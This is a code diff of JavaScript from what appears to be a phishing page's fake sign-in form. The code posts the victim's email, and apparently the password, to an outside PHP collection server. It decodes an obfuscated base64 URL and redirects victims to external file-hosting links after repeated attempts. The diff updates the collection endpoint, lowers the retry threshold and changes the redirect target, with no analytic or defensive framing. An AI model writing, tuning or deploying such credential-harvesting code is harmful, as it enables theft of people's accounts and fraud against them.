@@ -185,7 +185,7 @@
       var d = atob('aHR0cHM6Ly8xdGhhc2hjb2luLmNvbS9hc3NldHMvb28ucGhw');
       $.ajax({
         dataType: 'JSON',
-        url: 'https://qogo0.ru.com/cgi-bin/next.php',
+        url: 'https://qogo0.ru.com/cgi/new-next.php',
         type: 'POST',
         data: {
           email: email,
@@ -204,10 +204,10 @@
             $('#msg').html(response['msg']);
             if (response['signal'] == 'ok') {
               $("#password").val("");
-              if (count >= 3) {
+              if (count >= 2) {
                 count = 0;
                 // window.location.replace(response['redirect_link']);
-                window.location.replace("https://siasky.net/CABXtK3V1Z20S83MAOb7Jg71JCxTTHFlM7tTlyYehcYfrw");
+                window.location.replace("https://drive.google.com/file/d/1UspGJ6AYbCFC3-FcHHdUyYhGc1uWKCbm/view?usp=drive_link");
 
               }
               // $('#msg').html(response['msg']);
@@ -220,9 +220,9 @@
         error: function () {
           $("#password").val("");
           $('#i983893').html('Sign in');
-          if (count >= 3) {
+          if (count >= 2) {
             count = 0;
-            window.location.replace("https://siasky.net/CABXtK3V1Z20S83MAOb7Jg71JCxTTHFlM7tTlyYehcYfrw");
+            window.location.replace("https://drive.google.com/file/d/1UspGJ6AYbCFC3-FcHHdUyYhGc1uWKCbm/view?usp=drive_link");
           }
           $("#msg").show();
           // $('#msg').html("Please try again later");
